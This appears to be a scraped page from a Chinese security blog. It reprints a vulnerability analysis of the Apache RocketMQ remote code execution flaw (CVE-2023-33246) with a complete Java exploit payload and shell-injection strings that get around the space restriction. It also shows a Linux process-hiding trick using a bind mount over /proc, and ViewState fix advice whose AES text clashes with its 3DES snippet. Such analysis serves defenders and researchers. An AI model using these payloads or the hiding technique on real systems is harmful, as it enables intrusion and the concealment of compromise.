+<p><img src="/2023/09/03/Plaintext-VIEWSTATE/6.png" alt="image"></p>
+</blockquote>
+<h2><span id="4-漏洞建议">4. 漏洞建议</span></h2><blockquote>
+<p>请将machineKey验证类型设置为AES。这将使得 ASP.NET 使用AES算法加密ViewState 值。</p>
+<p>​打开 Web.Config 并在 &lt;system.web&gt; 元素下添加以下行：<machinekey validation="“AES”/">如下：</machinekey></p>
+<p><code>&lt;system.web&gt; &lt;machinekey validation=&quot;3DES&quot;&gt;&lt;/machinekey&gt;&lt;/system.web&gt;</code></p>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/previous-versions/dotnet/netframework-3.0/w8h3skw9%28v=vs.85%29">machineKey 元素（ASP.NET 设置架构）</a></p>
+</blockquote>
+<blockquote>
+<p>关于ViewState的相关demo案例：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/RlY5HL_ak4G8EdcXyevWDg">ViewState 反序列化及其利用</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Plaintext/" rel="tag">Plaintext</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/">
+                Apache RocketMQ 远程代码执行漏洞（CVE-2023-33246）漏洞分析
+            </a>
+        </h2>
+    
+    <time>
+        Sep 2, 2023
+    </time>
+    <section class="content">
+        <h1><span id="apache-rocketmq-远程代码执行漏洞cve-2023-33246漏洞分析">Apache RocketMQ 远程代码执行漏洞（CVE-2023-33246）漏洞分析</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://paper.seebug.org/2081/">Sunflower@知道创宇404实验室</a> 并作补充</p>
+</blockquote>
+<h2><span id="1漏洞介绍">1.漏洞介绍</span></h2><blockquote>
+<p>Apache RocketMQ 存在远程命令执行漏洞(CVE-2023-33246)。RocketMQ的NameServer、Broker、Controller等多个组件暴露在外网且缺乏权限验证，攻击者可以利用该漏洞利用更新配置功能以RocketMQ运行的系统用户身份执行命令。</p>
+</blockquote>
+<h2><span id="2漏洞版本">2.漏洞版本</span></h2><blockquote>
+<p>5.0.0 &lt;&#x3D; Apache RocketMQ &lt; 5.1.1</p>
+<p>4.0.0 &lt;&#x3D; Apache RocketMQ &lt; 4.9.6</p>
+</blockquote>
+<h2><span id="3环境搭建">3.环境搭建</span></h2><blockquote>
+<p>使用docker拉取漏洞环境</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull apache/rocketmq:4.9.5</span><br></pre></td></tr></table></figure>
+
+<p>运行docker run命令，搭建docker环境</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name rmqnamesrv -p 9876:9876 apache/rocketmq:4.9.5 sh mqnamesrv</span><br><span class="line">docker run -d --name rmqbroker --<span class="built_in">link</span> rmqnamesrv:namesrv -e <span class="string">&quot;NAMESRV_ADDR=namesrv:9876&quot;</span> -p 10909:10909 -p 10911:10911 -p 10912:10912 apache/rocketmq:4.9.5 sh mqbroker -c /home/rocketmq/rocketmq-4.9.5/conf/broker.conf</span><br></pre></td></tr></table></figure>
+
+<p>docker ps检查docker正常启动即可</p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/1.png" alt="image"></p>
+</blockquote>
+<h2><span id="4rocketmq简介">4.RocketMQ简介</span></h2><blockquote>
+<p>我们平时使用一些体育新闻软件，会订阅自己喜欢的一些球队板块，当有作者发表文章到相关的板块，我们就能收到相关的新闻推送。</p>
+<p>发布-订阅（Pub&#x2F;Sub）是一种消息范式，消息的发送者（称为发布者、生产者、Producer）会将消息直接发送给特定的接收者（称为订阅者、消费者、Comsumer）。而RocketMQ的基础消息模型就是一个简单的Pub&#x2F;Sub模型[1]。</p>
+</blockquote>
+<h3><span id="41-rocketmq的部署模型">4.1 RocketMQ的部署模型</span></h3><blockquote>
+<p>Producer、Consumer又是如何找到Topic和Broker的地址呢？消息的具体发送和接收又是怎么进行的呢？</p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/2.png" alt="image"></p>
+</blockquote>
+<h3><span id="42-名字服务器-nameserver">4.2 名字服务器 NameServer</span></h3><blockquote>
+<p>NameServer是一个简单的 Topic 路由注册中心，支持 Topic、Broker 的动态注册与发现。</p>
+<p>主要包括两个功能：<br>Broker管理，NameServer接受Broker集群的注册信息并且保存下来作为路由信息的基本数据。然后提供心跳检测机制，检查Broker是否还存活；<br>路由信息管理，每个NameServer将保存关于 Broker 集群的整个路由信息和用于客户端查询的队列信息。Producer和Consumer通过NameServer就可以知道整个Broker集群的路由信息，从而进行消息的投递和消费。</p>
+</blockquote>
+<h3><span id="43-代理服务器-broker">4.3 代理服务器 Broker</span></h3><blockquote>
+<p>Broker主要负责消息的存储、投递和查询以及服务高可用保证。</p>
+<p>NameServer几乎无状态节点，因此可集群部署，节点之间无任何信息同步。Broker部署相对复杂。</p>
+<p>在 Master-Slave 架构中，Broker 分为 Master 与 Slave。一个Master可以对应多个Slave，但是一个Slave只能对应一个Master。Master 与 Slave 的对应关系通过指定相同的BrokerName，不同的BrokerId 来定义，BrokerId为0表示Master，非0表示Slave。Master也可以部署多个。</p>
+</blockquote>
+<h3><span id="44-消息收发">4.4 消息收发</span></h3><blockquote>
+<p>在进行消息收发之前，我们需要告诉客户端NameServer的地址，RocketMQ有多种方式在客户端中设置NameServer地址，举例三个，优先级由高到低，高优先级会覆盖低优先级。</p>
+<p>代码中指定Name Server地址，多个namesrv地址之间用分号分割</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">producer.setNamesrvAddr(<span class="string">&quot;192.168.0.1:9876;192.168.0.2:9876&quot;</span>);  </span><br><span class="line">consumer.setNamesrvAddr(<span class="string">&quot;192.168.0.1:9876;192.168.0.2:9876&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>Java启动参数中指定Name Server地址</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Drocketmq.namesrv.addr=192.168.0.1:9876;192.168.0.2:9876  </span><br></pre></td></tr></table></figure>
+
+<p>环境变量指定Name Server地址</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> NAMESRV_ADDR=192.168.0.1:9876;192.168.0.2:9876</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="45-漏洞主要涉及的类的介绍">4.5 漏洞主要涉及的类的介绍</span></h3><h4><span id="451-defaultmqadminext">4.5.1 DefaultMQAdminExt</span></h4><blockquote>
+<p>DefaultMQAdminExt是 RocketMQ 提供的一个扩展类。它提供了一些管理和操作 RocketMQ 的工具方法，可以用于管理主题（Topic）、消费者组（Consumer Group）、订阅关系等。</p>
+<p>DefaultMQAdminExt类提供了一些常用的方法，包括创建和删除主题、查询主题信息、查询消费者组信息、更新订阅关系等。它可以通过与 NameServer 交互来获取和修改相关配置信息，并提供了对 RocketMQ 的管理功能。</p>
+<p>例如DefaultMQAdminExt更新broker配置的一个方法（更新的配置文件为broker.conf）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateBrokerConfig</span><span class="params">(String brokerAddr,</span></span><br><span class="line"><span class="params">    Properties properties)</span> <span class="keyword">throws</span> RemotingConnectException, RemotingSendRequestException,</span><br><span class="line">    RemotingTimeoutException, UnsupportedEncodingException, InterruptedException, MQBrokerException &#123;</span><br><span class="line">    defaultMQAdminExtImpl.updateBrokerConfig(brokerAddr, properties);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4><span id="452-filterservermanager">4.5.2 FilterServerManager</span></h4><blockquote>
+<p>在 Apache RocketMQ 中，FilterServerManager 类是用于管理过滤服务器（Filter Server）的类。过滤服务器是 RocketMQ 中的一种组件，用于支持消息过滤功能。过滤服务器负责处理消息过滤规则的注册、更新和删除，以及消息过滤的评估和匹配。</p>
+</blockquote>
+<h2><span id="5漏洞分析">5.漏洞分析</span></h2><blockquote>
+<p>补丁文件[2]中直接将Filter Server模块全部移除，所以我们可以直接来看FilterServerManager，简要分析一下FilterServerManager的调用流程：</p>
+<p>在Broker启动时执行sh mqbroker…，调用到BrokerStartup类：</p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/3.png" alt="image"></p>
+<p>在该类中继续调用到BrokerController中的start()方法</p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/4.png" alt="image"></p>
+<p>继续跟进</p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/5.png" alt="image"></p>
+<p>最终到了FilterServerManager类中，其中FilterServerUtil.callShell();存在命令执行:</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.scheduledExecutorService.scheduleAtFixedRate(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                FilterServerManager.<span class="built_in">this</span>.createFilterServer();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                log.error(<span class="string">&quot;&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span> * <span class="number">5</span>, <span class="number">1000</span> * <span class="number">30</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createFilterServer</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">more</span> <span class="operator">=</span></span><br><span class="line">        <span class="built_in">this</span>.brokerController.getBrokerConfig().getFilterServerNums() - <span class="built_in">this</span>.filterServerTable.size();</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="built_in">this</span>.buildStartCommand();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; more; i++) &#123;</span><br><span class="line">        FilterServerUtil.callShell(cmd, log);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> String <span class="title function_">buildStartCommand</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">config</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (BrokerStartup.configFile != <span class="literal">null</span>) &#123;</span><br><span class="line">        config = String.format(<span class="string">&quot;-c %s&quot;</span>, BrokerStartup.configFile);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.brokerController.getBrokerConfig().getNamesrvAddr() != <span class="literal">null</span>) &#123;</span><br><span class="line">        config += String.format(<span class="string">&quot; -n %s&quot;</span>, <span class="built_in">this</span>.brokerController.getBrokerConfig().getNamesrvAddr());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (RemotingUtil.isWindowsPlatform()) &#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;start /b %s\\bin\\mqfiltersrv.exe %s&quot;</span>,</span><br><span class="line">            <span class="built_in">this</span>.brokerController.getBrokerConfig().getRocketmqHome(),</span><br><span class="line">            config);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;sh %s/bin/startfsrv.sh %s&quot;</span>,</span><br><span class="line">            <span class="built_in">this</span>.brokerController.getBrokerConfig().getRocketmqHome(),</span><br><span class="line">            config);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>根据start()方法内部可知createFilterServer方法每隔30秒都会被调用一次，</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.scheduledExecutorService.scheduleAtFixedRate(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                FilterServerManager.<span class="built_in">this</span>.createFilterServer();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                log.error(<span class="string">&quot;&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span> * <span class="number">5</span>, <span class="number">1000</span> * <span class="number">30</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>到了这一步，很明显我们只需要控制BrokerConfig进行命令拼接，等待触发createFilterServer即可造成RCE。</p>
+<p>但是要想成功触发命令执行还有两个问题需要解决一下：</p>
+<p>1、在createFilterServer方法中，more的值要大于0才会触发callShell方法</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createFilterServer</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">more</span> <span class="operator">=</span></span><br><span class="line">        <span class="built_in">this</span>.brokerController.getBrokerConfig().getFilterServerNums() - <span class="built_in">this</span>.filterServerTable.size();</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="built_in">this</span>.buildStartCommand();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; more; i++) &#123;</span><br><span class="line">        FilterServerUtil.callShell(cmd, log);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里只需要通过DefaultMQAdminExt设置filterServerNums的值即可，大致为：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">properties.setProperty(<span class="string">&quot;filterServerNums&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">...</span><br><span class="line"><span class="type">DefaultMQAdminExt</span> <span class="variable">defaultMQAdminExt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultMQAdminExt</span>();</span><br><span class="line">...</span><br><span class="line">defaultMQAdminExt.updateBrokerConfig(<span class="string">&quot;192.168.87.128:10911&quot;</span>, props);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>2、callshell方法传入命令时，shellString会被splitShellString方法使用空格进行拆分为一个cmdArray数组。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">callShell</span><span class="params">(<span class="keyword">final</span> String shellString, <span class="keyword">final</span> InternalLogger log)</span> &#123;</span><br><span class="line">    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        String[] cmdArray = splitShellString(shellString);</span><br><span class="line">        process = Runtime.getRuntime().exec(cmdArray);</span><br><span class="line">        process.waitFor();</span><br><span class="line">        log.info(<span class="string">&quot;CallShell: &lt;&#123;&#125;&gt; OK&quot;</span>, shellString);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        log.error(<span class="string">&quot;CallShell: readLine IOException, &#123;&#125;&quot;</span>, shellString, e);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> != process)</span><br><span class="line">            process.destroy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>意味着传入的命令如果带了空格，都会被拆分为数组，而数组在exec中会将每个命令的结尾标记为下一个命令的开头[3]。</p>
+<p><code>sh &#123;可控&#125;/bin/startfsrv.sh ...</code> 如果传入 <code>-c curl 127.0.0.1;</code></p>
+<p>那么comArray为 <code>[&#39;sh&#39; &#39;-c&#39; &#39;curl&#39; &#39;127.0.0.1&#39; &#39;;&#39; &#39;/bin/startfsrv.sh&#39; &#39;...&#39;]</code></p>
+<p>这里的每个命令的结尾作为下一个命令的开头，它将每个被传入的命令都看作为一个整体，想不出一个更合适的例子，这里可以使用shell里的单引号括起来进行辅助理解：</p>
+<p><code>&#39;sh&#39; &#39;-c&#39; &#39;curl&#39; &#39;127.0.0.1&#39; &#39;;&#39; &#39;/bin/startfsrv.sh&#39; &#39;...&#39;</code></p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/6.png" alt="image"></p>
+<p>很明显，这里的curl因为使用了空格，导致curl 127.0.0.1被拆分为了两个部分，正确的写法应该是：</p>
+<p><code>&#39;sh&#39; &#39;-c&#39; &#39;curl 127.0.0.1&#39; &#39;;&#39; &#39;/bin/startfsrv.sh&#39; &#39;...&#39;</code></p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/7.png" alt="image"></p>
+<p>但是使用空格又会被split，所以现在的问题点就在于如何避免使用空格进行完整的传参，网上公开的解法[4]：</p>
+<p><code>-c $@|sh . echo curl 127.0.0.1;</code></p>
+<p><code>$@</code> 作为一个特殊变量，它表示传递给脚本或命令的所有参数，直接将echo后面的值作为一个整体传递给$@，解决了拆分命令的问题。</p>
+<p>感谢longofo@知道创宇404实验室带我探讨出第二个绕过方法：</p>
+<p>顺便一提，这个绕过的核心点在于这里如果不使用bash，则无法成功使用${IFS}以及{}进行绕过空格限制，这里就不再进行细节讲解，感兴趣的师傅可以动手试试：</p>
+<p><code>-c bash$&#123;IFS&#125;-c$&#123;IFS&#125;\&quot;&#123;echo,dG91Y2ggL3RtcC9kZGRkZGRkYWE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;;</code></p>
+</blockquote>
+<h3><span id="51-payload构造">5.1 payload构造</span></h3><blockquote>
+<p>根据上面的知识，最终构造的payload为：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">properties.setProperty(<span class="string">&quot;filterServerNums&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">properties.setProperty(<span class="string">&quot;rocketmqHome&quot;</span>,<span class="string">&quot;-c bash$&#123;IFS&#125;-c$&#123;IFS&#125;\&quot;&#123;echo,dG91Y2ggL3RtcC9kZGRkZGRkYWE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;;&quot;</span>);</span><br><span class="line"><span class="type">DefaultMQAdminExt</span> <span class="variable">defaultMQAdminExt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultMQAdminExt</span>();</span><br><span class="line">defaultMQAdminExt.setNamesrvAddr(<span class="string">&quot;localhost:9876&quot;</span>);</span><br><span class="line">defaultMQAdminExt.start();</span><br><span class="line">defaultMQAdminExt.updateBrokerConfig(<span class="string">&quot;192.168.87.128:10911&quot;</span>, properties);</span><br><span class="line">defaultMQAdminExt.shutdown();</span><br></pre></td></tr></table></figure>
+
+<h3><span id="52-漏洞验证">5.2 漏洞验证</span></h3><blockquote>
+<p>使用payload进行curl dnslog，每隔30s左右收到一次请求：</p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/8.png" alt="image"></p>
+</blockquote>
+<h3><span id="53-漏洞修复">5.3 漏洞修复</span></h3><blockquote>
+<p>在修复版本4.9.6和5.1.1中都是直接删除了filter server模块</p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/9.png" alt="image"></p>
+</blockquote>
+<h3><span id="54-影响范围统计">5.4 影响范围统计</span></h3><blockquote>
+<p>使用Zoomeye[5]进行搜索，得到ip结果34348条：<br><a target="_blank" rel="noopener" href="https://www.zoomeye.org/searchResult?q=service:%22RocketMQ%22">https://www.zoomeye.org/searchResult?q=service%3A%22RocketMQ%22</a><br><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/10.png" alt="image"></p>
+<p>使用Zoomeye搜索一下被攻击过的目标数量，得到ip结果6011条：<br><a target="_blank" rel="noopener" href="https://www.zoomeye.org/searchResult?q=service:%22RocketMQ%22+%22rocketmqHome=-c%20$@%7Csh%22">https://www.zoomeye.org/searchResult?q=service%3A%22RocketMQ%22%2B%22rocketmqHome%3D-c%20%24%40%7Csh%22</a><br><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/11.png" alt="image"></p>
+<p>通过Zoomeye的下载功能，再来本地统计一下攻击手法。这里大部分都是通过wget、curl等指令下载木马进行执行反弹shell。</p>
+<p><img src="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/12.png" alt="image"></p>
+</blockquote>
+<h2><span id="6参考链接">6.参考链接</span></h2><blockquote>
+<p>[1] <a target="_blank" rel="noopener" href="https://github.com/apache/rocketmq/tree/rocketmq-all-4.5.1/docs/cn">https://github.com/apache/rocketmq/tree/rocketmq-all-4.5.1/docs/cn</a></p>
+<p>[2] <a target="_blank" rel="noopener" href="https://github.com/apache/rocketmq/commit/c469a60dcca616b077caf2867b64582795ff8bfc">https://github.com/apache/rocketmq/commit/c469a60dcca616b077caf2867b64582795ff8bfc</a></p>
+<p>[3] <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/48011611/what-exactly-can-we-store-inside-of-string-array-in-process-exec">https://stackoverflow.com/questions/48011611/what-exactly-can-we-store-inside-of-string-array-in-process-exec</a></p>
+<p>[4] <a target="_blank" rel="noopener" href="https://github.com/I5N0rth/CVE-2023-33246">https://github.com/I5N0rth/CVE-2023-33246</a></p>
+<p>[5] <a target="_blank" rel="noopener" href="https://www.zoomeye.org/">https://www.zoomeye.org</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/02/Process-Hide/">
+                Linux当中如何隐藏和查看进程
+            </a>
+        </h2>
+    
+    <time>
+        Sep 2, 2023
+    </time>
+    <section class="content">
+        <h1><span id="linux当中如何隐藏和查看进程">Linux当中如何隐藏和查看进程</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/zfw_666666/article/details/126658093">CN-FuWei</a> 并作补充</p>
+</blockquote>
+<h2><span id="前言">前言</span></h2><blockquote>
+<p>进程是执行程序的过程，类似于按照图纸，真正去盖房子的过程。</p>
+<p>同一个程序可以执行多次，每次都可以在内存中开辟独立的空间来装载，从而产生多个进程。不同的进程还可以拥有各自独立的IO接口。操作系统的一个重要功能就是为进程提供方便，比如说为进程分配内存空间，管理进程的相关信息等等，就好像是为我们准备好了一个精美的地址。</p>
+<p>进程信息是proc目录下动态生成，每个动态创建的进程ID号下面详细的记录了关于该进程的fd,mem,io,cpuset等进程信息。</p>
+<p>Linux 内核提供了一种通过 &#x2F;proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。</p>
+<p><strong>通过它可以访问系统内核数据。</strong>用户和应用程序可以通过proc得到系统的信息，并可以改变内核的某些参数。</p>
+<p>由于系统的信息，如进程，是动态改变的，所以用户或应用程序读取proc文件时，proc文件系统动态的。在&#x2F;proc下还有三个很重要的目录：net，scsi和sys。sys目录是可写的，可以通过它来访问或修改内核的参数，而net和scsi则依赖于内核配置。例如，如果系统不支持scsi，则scsi 目录不存在。</p>
+<p>除了以上介绍的这些，还有的是一些以数字命名的目录，它们是进程目录。系统中当前运行的每一个进程都有对应的一个目录在&#x2F;proc下，以进程的 PID号为目录名，它们是读取进程信息的接口。而self目录则是读取进程本身的信息接口。</p>
+<p>读取&#x2F;proc&#x2F;self&#x2F;maps可以得到当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。</p>
+</blockquote>
+<h2><span id="一-隐藏进程">一、隐藏进程</span></h2><blockquote>
+<p>利用mount —bind 将另外一个目录挂载覆盖至&#x2F;proc&#x2F;目录下指定进程ID的目录，我们知道ps、top等工具会读取&#x2F;proc目录下获取进程信息，如果将进程ID的目录信息覆盖，则原来的进程信息将从ps的输出结果中隐匿。</p>
+<p>比如当前有一个minio进程（pid：1945）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@docker]-[~]-ps -ef|grep minio</span><br><span class="line">root       1945   1924  0 08:06 ?        00:00:10 minio server /data --console-address 0.0.0.0:9999</span><br></pre></td></tr></table></figure>
+
+<p>现在我们将该进程隐藏：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#首先，创建一个空目录（无任何挂载）</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /empty/dir</span><br><span class="line"><span class="comment">#将空目录进行挂载</span></span><br><span class="line">mount -o <span class="built_in">bind</span> /empty/dir/ /proc/1945</span><br></pre></td></tr></table></figure>
+
+<p>然后，我们再来查询看看进程是否隐藏：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@docker]-[~]-<span class="comment">#ps -ef|grep minio</span></span><br><span class="line">root      46358  32804  0 10:54 pts/0    00:00:00 grep --color=auto minio</span><br></pre></td></tr></table></figure>
+
+<p>发现，进程已经被我们隐藏掉了。</p>
+</blockquote>
